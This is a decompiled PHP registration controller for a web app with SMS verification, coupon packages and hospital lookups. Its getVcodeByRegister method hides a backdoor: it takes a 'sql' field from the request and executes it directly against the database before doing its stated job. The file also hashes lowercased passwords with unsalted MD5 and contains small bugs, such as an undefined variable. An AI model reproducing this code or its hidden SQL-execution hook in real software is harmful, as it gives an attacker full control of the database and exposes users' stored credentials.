<?php
//dezend by http://www.yunlu99.com/ QQ:270656184
namespace User\Controller;

class RegisterController extends \Home\Controller\BaseController
{
	static public function get_param()
	{
		$data = i('data', '', 'trim');
		$sign = i('sign', '', 'trim');
		return checksign($data, $sign);
	}

	public function checkUserByMobile()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$user_type = intval($data['user_type']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_package_coupon = m('user_package_coupon');
		$map = array('mobile' => $mobile, 'active' => 1, 'is_delete' => 0);
		$user_info = $user_main->where($map)->find();

		if (!empty($user_info)) {
			if ($user_info['is_activate'] == 1) {
				$result['msg_code'] = '0024';
				exit(returnjson($result));
			}

			if ($user_type != intval($user_info['user_type'])) {
				$result['msg_code'] = '0220';
				exit(returnjson($result));
			}

			if ($user_type == 0) {
				$map = array('user_id' => $user_info['id']);

				if (0 < $user_package_coupon->where($map)->count()) {
					$result['msg_code'] = '0201';
					exit(returnjson($result));
				}
			}

			$result['msg_code'] = '0033';
			exit(returnjson($result));
		}

		$result['msg_code'] = '0202';
		exit(returnjson($result));
	}

	public function activeUser()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$passwd = strval($data['passwd']);
		$v_code = strval($data['v_code']);
		$get_way = intval($data['get_way']);
		$user_type = intval($data['user_type']);
		$package_code = c('PACKAGE_CODE');
		$send_package_switch = c('SEND_PACKAGE_SWITCH');
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if (strlen($v_code) != 6) {
			$result['msg_code'] = '0054';
			exit(returnjson($result));
		}

		if ((strlen($passwd) < 6) || (15 < strlen($passwd))) {
			$result['msg_code'] = '0019';
			exit(returnjson($result));
		}

		if (($user_type == 0) && empty($package_code)) {
			$result['msg_code'] = '0204';
			exit(returnjson($result));
		}

		$passwd = md5(strtolower($passwd));
		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$user_package_coupon = m('user_package_coupon');
		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 1, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->find();
		if (empty($res) || ($res['v_code'] != $v_code)) {
			$result['msg_code'] = '0017';
			exit(returnjson($result));
		}

		$last_time = $res['addtime'];
		$current_time = time();

		if (120 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '0035';
			exit(returnjson($result));
		}

		$user_sms->where($map)->save(array('v_status' => 1));

		if ($send_package_switch) {
			$package_coupon = m('package_coupon');
			$now_date = strtotime(date('Y-m-d', time()));
			$map = array(
				'code'         => $package_code,
				'expire_begin' => array('ELT', $now_date),
				'expire_end'   => array('EGT', $now_date),
				'active'       => 1,
				'is_delete'    => 0
				);
			$package_info = $package_coupon->where($map)->find();

			if (empty($package_info)) {
				$result['msg_code'] = '0205';
				exit(returnjson($result));
			}

			$number = intval($package_info['number']);
			$package_id = intval($package_info['id']);
			$package_count = $user_package_coupon->where(array('package_id' => $package_id))->count();

			if ($number <= $package_count) {
				$result['msg_code'] = '0207';
				exit(returnjson($result));
			}
		}

		$map = array('mobile' => $mobile, 'active' => 1, 'is_delete' => 0);
		$data = array('passwd' => $passwd, 'is_activate' => 1);

		if (!$user_main->where($map)->save($data)) {
			$result['msg'] = '用户注册失败！';
			$result['msg_code'] = '0012';
			exit(returnjson($result));
		}

		$user_info = $user_main->where($map)->find();
		$user_info['avatar'] = c('COS_FILE_URL') . $user_info['avatar'];
		$user_info['avatar_thumb'] = c('COS_FILE_URL') . $user_info['avatar_thumb'];

		if ($user_type == 1) {
			$result['msg'] = '用户注册成功！';
			$result['msg_code'] = '9004';
			$result['data'] = $user_info;
			exit(returnjson($result));
		}

		if ($send_package_switch) {
			$data = array('package_id' => $package_id, 'coupon_ids' => $package_info['coupon_ids'], 'action_type' => 1, 'get_way' => $get_way, 'user_id' => $user_info['id'], 'get_time' => strtotime('now'), 'is_use' => 0, 'active' => 1, 'is_delete' => 0);
			$user_package_coupon->add($data);
			$couponArr = explode(',', $package_info['coupon_ids']);

			if (empty($couponArr)) {
				$result['msg_code'] = '0206';
				exit(returnjson($result));
			}

			foreach ($couponArr as $value) {
				if (empty($value)) {
					continue;
				}

				$data = array('coupon_id' => $value, 'action_type' => 1, 'user_id' => $user_info['id'], 'get_time' => strtotime('now'), 'is_use' => 0, 'active' => 1, 'is_delete' => 0);
				$dataList[] = $data;
			}

			$user_coupon = m('user_coupon');
			$user_coupon->addAll($dataList);
		}

		$result['msg'] = '用户注册成功！';
		$result['msg_code'] = '9004';
		$result['data'] = $user_info;
		exit(returnjson($result));
	}

	public function getVcodeByRegister()
	{
		$data = self::get_param();
		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		$mobile = trim(strval($data['mobile']));
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '100022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile);

		if ($user_main->where($map)->find()) {
			$result['msg_code'] = '100024';
			exit(returnjson($result));
		}

		$map = array('mobile' => $mobile, 'stype' => 1, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('add_time desc')->find();

		if (!empty($res)) {
			$last_time = $res['add_time'];

			if ((time() - $last_time) < 60) {
				$result['msg_code'] = '100015';
				exit(returnjson($result));
			}
		}

		$v_code = strtolower(randstrcode(6, 'NUMBER'));
		$msg = '您的验证码是：' . strval($v_code) . '。请不要把验证码泄露给其他人。如非本人操作，可不用理会！';
		$error_code = $this->sendSms($mobile, $msg);

		if ($error_code == 0) {
			$data = array('user_id' => 0, 'mobile' => $mobile, 'msg' => $msg, 'v_code' => $v_code, 'stype' => 1, 'return_code' => $error_code, 'v_status' => 0, 'is_delete' => 0, 'add_time' => time());

			if ($user_sms->add($data)) {
				$result['msg'] = '验证短信已发送，请注意查收！';
				$result['msg_code'] = '0';
				exit(returnjson($result));
			}
			else {
				$result['msg_code'] = '100105';
				exit(returnjson($result));
			}
		}
		else {
			$result['msg_code'] = '100034';
			exit(returnjson($result));
		}
	}

	public function checkUserInfo()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$real_name = strval($data['real_name']);
		$hospital_id = strval($data['hospital_id']);
		$other_hospital_name = strval($data['other_hospital_name']);
		$device_type = intval($data['device_type']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if (4 < mb_strlen($real_name, 'utf-8')) {
			$result['msg_code'] = '0047';
			exit(returnjson($result));
		}

		if (empty($hospital_id)) {
			$result['msg_code'] = '0047';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$hospital_name = $other_hospital_name;

		if ($hospital_id != '-100') {
			$map = array('real_name' => $real_name, 'hospital_id' => $hospital_id, 'active' => 1, 'is_delete' => 0);
			$user_info = $user_main->field('id,mobile,real_name,hospital_id,department_id,job_num')->where($map)->find();

			if ($user_info) {
				$map = array('id' => $user_info['id']);
				$data = array('mobile' => $mobile);
				$user_main->where($map)->save($data);
				exit(returnjson($result));
			}
		}

		$map = array('active' => 1, 'is_delete' => 0);

		if ($hospital_id == '-100') {
			$map['hospital_name'] = array('LIKE', '%' . $hospital_name . '%');
		}
		else {
			$map['id'] = $hospital_id;
		}

		$hospital = m('hospital')->field('id,hospital_name')->where($map)->find();

		if (!empty($hospital)) {
			$hospital_name = $hospital['hospital_name'];
			$result['msg_code'] = '0203';
		}
		else {
			$result['msg_code'] = '0208';
		}

		$user_acquisition = m('user_acquisition');
		$map = array('mobile' => $mobile);
		$info = $user_acquisition->where($map)->find();
		$data = array('mobile' => $mobile, 'real_name' => $real_name, 'hospital_name' => $hospital_name, 'job_num' => $job_num, 'device_type' => $device_type, 'addtime' => strtotime('now'), 'active' => 1, 'is_delete' => 0);

		if ($info) {
			$user_acquisition->where($map)->save($data);
		}
		else {
			$user_acquisition->add($data);
		}

		exit(returnjson($result));
	}

	public function userAdd()
	{
		$data = self::get_param();
		$mobile = trim(strval($data['mobile']));
		$v_code = trim(strval($data['v_code']));
		$passwd = trim(strval($data['passwd']));
		$reg_code = trim(strval($data['reg_code']));
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '100022';
			exit(returnjson($result));
		}

		if ((strlen($passwd) < 6) || (15 < strlen($passwd))) {
			$result['msg_code'] = '100019';
			exit(returnjson($result));
		}

		$passwd = md5(strtolower($passwd));
		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$regcode_map = m('regcode_map');
		$map = array('mobile' => $mobile);

		if ($user_main->where($map)->find()) {
			$result['msg_code'] = '100024';
			exit(returnjson($result));
		}

		$recommend_id = null;

		if (!empty($reg_code)) {
			$map = array('reg_code' => $reg_code);
			$recommend_id = $user_main->where($map)->getField('id');
		}

		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 1, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->find();

		if (empty($res)) {
			$result['msg_code'] = '100017';
			exit(returnjson($result));
		}

		$last_time = $res['add_time'];
		$current_time = time();

		if (300 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '100035';
			exit(returnjson($result));
		}

		m()->startTrans();
		$res1 = $user_sms->where($map)->save(array('v_status' => 1));
		$reg_time = $last_login = time();
		$token = md5($mobile . time());
		$user_init = c('USER_INIT');
		$data = array('mobile' => $mobile, 'passwd' => $passwd, 'diamond_num' => $user_init['diamond_num'], 'user_gold' => $user_init['user_gold'], 'games_max' => $user_init['games_max'], 'clubs_max' => $user_init['clubs_max'], 'current_games' => $user_init['current_games'], 'current_clubs' => $user_init['current_clubs'], 'reg_code' => strtolower(randstrcode(6)), 'sale_code' => strtolower(randstrcode(6, 'NUMBER')), 'card_type' => $user_init['card_type'], 'card_expire' => time() + $user_init['card_expire'], 'token' => $token, 'reg_time' => $reg_time, 'last_login' => $last_login, 'is_online' => 1);
		$res2 = $user_id = $user_main->add($data);
		$map = array('mobile' => $mobile, 'stype' => 1);
		$user_sms->where($map)->save(array('is_delete' => 1));
		if (!empty($res1) && !empty($res2)) {
			m()->commit();

			if (!empty($recommend_id)) {
				$data = array('recommend_id' => $recommend_id, 'reg_id' => $user_id);
				$regcode_map->add($data);
			}

			$data = array('token' => $token, 'user_id' => $user_id);
			$result['data'] = $data;
			$result['msg_code'] = '0';
			$result['msg'] = '用户注册成功！';

			send_currency_report_real(intval($user_id),"",$mobile,16,1, intval($user_init["diamond_num"]),0,0,0,$result["msg"]);
			send_currency_report_real(intval($user_id),"",$mobile,16,2, intval($user_init["user_gold"]),0,0,0,$result["msg"]);
			send_event_report_real(intval($user_id),$mobile,14,intval($user_id["diamond_num"]),intval($user_init["user_gold"]),0,$reg_code,$v_code);
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100104';
			exit(returnjson($result));
		}
	}

	public function userActive()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$v_code = strval($data['v_code']);
		$passwd = strval($data['passwd']);
		$passwd = md5(strtolower($passwd));
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if (strlen($v_code) != 6) {
			$result['msg_code'] = '0054';
			exit(returnjson($result));
		}

		if (strlen($passwd) != 32) {
			$result['msg_code'] = '0019';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 1, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->find();

		if ($res['v_code'] != $v_code) {
			$result['msg_code'] = '0017';
			exit(returnjson($result));
		}

		$last_time = $res['addtime'];
		$current_time = time();

		if (120 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '0035';
			exit(returnjson($result));
		}

		$user_sms->where($map)->save(array('v_status' => 1));
		$map = array('mobile' => $mobile, 'active' => 0, 'is_delete' => 0);
		$res = $user_main->where($map)->find();
		$user_id = intval($res['user_id']);

		if (empty($user_id)) {
			$result['msg_code'] = '0013';
			exit(returnjson($result));
		}

		$map = array('id' => $user_id, 'active' => 0, 'is_delete' => 0);
		$regtime = $lastlogin = time();
		$data = array('passwd' => $passwd, 'regtime' => $regtime, 'lastlogin' => $lastlogin, 'active' => 1, 'is_delete' => 0);

		if ($user_main->where($map)->save($data)) {
			$result['msg'] = '用户激活成功！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function getProvinceList()
	{
		$data = self::get_param();
		$result['data'] = m('province')->field('code,name')->select();
		exit(returnjson($result));
	}

	public function getCityList()
	{
		$data = self::get_param();
		$province_code = intval($data['province_code']);

		if ($province_code <= 0) {
			$result['msg_code'] = '0072';
			exit(returnjson($result));
		}

		$map = array('provincecode' => $province_code);
		$result['data'] = m('city')->field('code,name')->where($map)->select();
		exit(returnjson($result));
	}

	public function getAreaList()
	{
		$data = self::get_param();
		$city_code = intval($data['city_code']);

		if ($city_code <= 0) {
			$result['msg_code'] = '0073';
			exit(returnjson($result));
		}

		$map = array('citycode' => $city_code);
		$result['data'] = m('area')->field('code,name')->where($map)->select();
		exit(returnjson($result));
	}

	public function getHospitalList()
	{
		$data = self::get_param();
		$area_id = intval($data['area_id']);

		if ($area_id <= 0) {
			$result['msg_code'] = '0074';
			exit(returnjson($result));
		}

		$map = array('area_id' => $area_id, 'active' => 1, 'is_delete' => 0);
		$result['data'] = m('hospital')->field('id,hospital_name')->where($map)->select();
		exit(returnjson($result));
	}

	public function getAllActiveHospitalList()
	{
		$data = self::get_param();
		$map = array('active' => 1, 'is_delete' => 0);
		$data = m('hospital')->field('id,hospital_name')->where($map)->select();
		array_push($data, array('id' => '-100', 'hospital_name' => '其他医院'));
		$result['data'] = $data;
		exit(returnjson($result));
	}
}

?>
